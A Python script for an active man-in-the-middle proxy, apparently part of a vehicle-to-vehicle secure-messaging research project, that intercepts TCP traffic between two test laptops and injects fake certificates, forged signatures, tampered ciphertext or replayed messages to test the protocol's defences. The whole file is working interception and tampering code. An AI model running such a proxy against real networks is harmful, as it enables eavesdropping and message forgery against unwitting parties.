"""Active Man-in-the-Middle network proxy for V2V communication.

This script sits between two vehicles (Laptop 1 and Laptop 2) acting as an invisible
proxy. It intercepts the TCP connection, reads the length-prefixed messages, and
allows us to modify them in transit to demonstrate different network attacks.

Usage:
  python attacks/active_mitm_node.py --listen-port 9002 --target-host <IP_A> --target-port 9001 --attack <type>

Attack Types:
  fake-cert: Replaces the HELLO message certificate with a fake self-signed one.
  forge-sig: Replaces the RESPONSE signature with an invalid one.
  tamper: Modifies the bytes of an encrypted BSM.
  replay: Captures a valid BSM and sends it repeatedly.
"""

import argparse
import json
import logging
import socket
import struct
import sys
import threading
import time
from datetime import datetime, timedelta
from pathlib import Path

# Ensure project root is on sys.path
_PROJECT_ROOT = str(Path(__file__).resolve().parent.parent)
if _PROJECT_ROOT not in sys.path:
    sys.path.insert(0, _PROJECT_ROOT)

from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric.ec import SECP256R1, generate_private_key
from cryptography.x509.oid import NameOID
from crypto.crypto import ecdsa_sign

logging.basicConfig(level=logging.INFO, format="[MITM] %(message)s")
log = logging.getLogger("mitm")


# ── TCP Framing Helpers ───────────────────────────────────────────────────

def recv_exactly(sock: socket.socket, n: int) -> bytes:
    buf = bytearray()
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise ConnectionError("Connection closed")
        buf.extend(chunk)
    return bytes(buf)


def recv_framed(sock: socket.socket) -> bytes:
    header = recv_exactly(sock, 4)
    length = struct.unpack(">I", header)[0]
    return recv_exactly(sock, length)


def send_framed(sock: socket.socket, data: bytes) -> None:
    sock.sendall(struct.pack(">I", len(data)) + data)


# ── Attack Helpers ────────────────────────────────────────────────────────

def make_fake_cert(common_name: str) -> str:
    """Generate a self-signed certificate PEM string."""
    fake_key = generate_private_key(SECP256R1())
    subject = x509.Name([
        x509.NameAttribute(NameOID.COMMON_NAME, common_name),
        x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Attacker-Inc"),
    ])
    cert = (
        x509.CertificateBuilder()
        .subject_name(subject)
        .issuer_name(subject)
        .public_key(fake_key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(datetime.utcnow())
        .not_valid_after(datetime.utcnow() + timedelta(days=365))
        .add_extension(x509.BasicConstraints(ca=False, path_length=None), critical=True)
        .sign(private_key=fake_key, algorithm=hashes.SHA256())
    )
    return cert.public_bytes(serialization.Encoding.PEM).decode("utf-8")


def generate_forged_signature() -> str:
    """Generate a random invalid signature."""
    fake_key = generate_private_key(SECP256R1())
    return ecdsa_sign(fake_key, b"random_garbage_data").hex()


# ── Proxy Logic ───────────────────────────────────────────────────────────

class MitmProxy:
    def __init__(self, listen_port: int, target_host: str, target_port: int, attack_type: str):
        self.listen_port = listen_port
        self.target_host = target_host
        self.target_port = target_port
        self.attack_type = attack_type
        
        self.client_sock = None
        self.server_sock = None
        
        # State for attacks
        self.captured_bsm = None
        self.running = True

    def start(self):
        # 1. Listen for connection from Vehicle B (Client)
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind(("0.0.0.0", self.listen_port))
        listener.listen(1)
        
        log.info("="*50)
        log.info(f" ACTIVE MITM PROXY STARTED")
        log.info(f" Mode: {self.attack_type}")
        log.info(f" Listening on port {self.listen_port} for Vehicle B...")
        log.info("="*50)

        self.client_sock, addr = listener.accept()
        log.info(f"Vehicle B connected from {addr}")

        # 2. Connect to Vehicle A (Server)
        log.info(f"Connecting to Vehicle A at {self.target_host}:{self.target_port}...")
        self.server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            self.server_sock.connect((self.target_host, self.target_port))
            log.info("Connected to Vehicle A.")
        except Exception as e:
            log.error(f"Failed to connect to Vehicle A: {e}")
            return

        # 3. Start relay threads
        t1 = threading.Thread(target=self._relay, args=(self.client_sock, self.server_sock, "C->S"), daemon=True)
        t2 = threading.Thread(target=self._relay, args=(self.server_sock, self.client_sock, "S->C"), daemon=True)
        
        t1.start()
        t2.start()

        if self.attack_type == "replay":
            threading.Thread(target=self._replay_loop, daemon=True).start()

        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            log.info("Shutting down...")
            self.running = False
            self.client_sock.close()
            self.server_sock.close()

    def _relay(self, src: socket.socket, dst: socket.socket, direction: str):
        """Relay packets between src and dst, modifying them based on the attack type."""
        try:
            while self.running:
                data = recv_framed(src)
                modified_data = self._process_data(data, direction)
                if modified_data is not None:
                    send_framed(dst, modified_data)
        except ConnectionError:
            log.info(f"Connection closed ({direction})")
            self.running = False

    def _process_data(self, data: bytes, direction: str) -> bytes:
        """Process and potentially modify a framed message."""
        try:
            # Try parsing as JSON (Handshake messages)
            text = data.decode("utf-8")
            msg = json.loads(text)
            msg_type = msg.get("msg_type")
            
            if msg_type == "HELLO" and self.attack_type == "fake-cert":
                log.info(f"[{direction}] INTERCEPTED HELLO. Injecting fake certificate!")
                msg["certificate_pem"] = make_fake_cert(msg.get("vehicle_id", "unknown"))
                return json.dumps(msg).encode("utf-8")

            if msg_type == "RESPONSE" and self.attack_type == "forge-sig":
                log.info(f"[{direction}] INTERCEPTED RESPONSE. Forging signature!")
                msg["signed_nonces"] = generate_forged_signature()
                return json.dumps(msg).encode("utf-8")

            log.info(f"[{direction}] Relaying {msg_type}")
            return data

        except (UnicodeDecodeError, json.JSONDecodeError):
            # Not JSON, must be an encrypted BSM
            
            if self.attack_type == "tamper":
                log.info(f"[{direction}] INTERCEPTED BSM. Tampering bytes!")
                # Flip a bit in the encrypted payload
                tampered = bytearray(data)
                tampered[10] = tampered[10] ^ 0xFF 
                return bytes(tampered)
                
            if self.attack_type == "replay" and self.captured_bsm is None:
                log.info(f"[{direction}] INTERCEPTED BSM. Captured for replay attack!")
                self.captured_bsm = data
                self.replay_dst = "server" if direction == "C->S" else "client"

            # log.info(f"[{direction}] Relaying BSM")
            return data
            
    def _replay_loop(self):
        """Continuously send the captured BSM to trigger a ReplayError."""
        while self.running:
            if self.captured_bsm:
                dst = self.server_sock if self.replay_dst == "server" else self.client_sock
                log.info(">>> REPLAYING CAPTURED BSM <<<")
                try:
                    send_framed(dst, self.captured_bsm)
                except:
                    pass
            time.sleep(1.5)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Active MITM Proxy")
    parser.add_argument("--listen-port", type=int, required=True, help="Port to listen on for Vehicle B")
    parser.add_argument("--target-host", required=True, help="IP of Vehicle A")
    parser.add_argument("--target-port", type=int, required=True, help="Port of Vehicle A")
    parser.add_argument("--attack", choices=["fake-cert", "forge-sig", "tamper", "replay", "none"], default="none")
    
    args = parser.parse_args()
    
    proxy = MitmProxy(args.listen_port, args.target_host, args.target_port, args.attack)
    proxy.start()
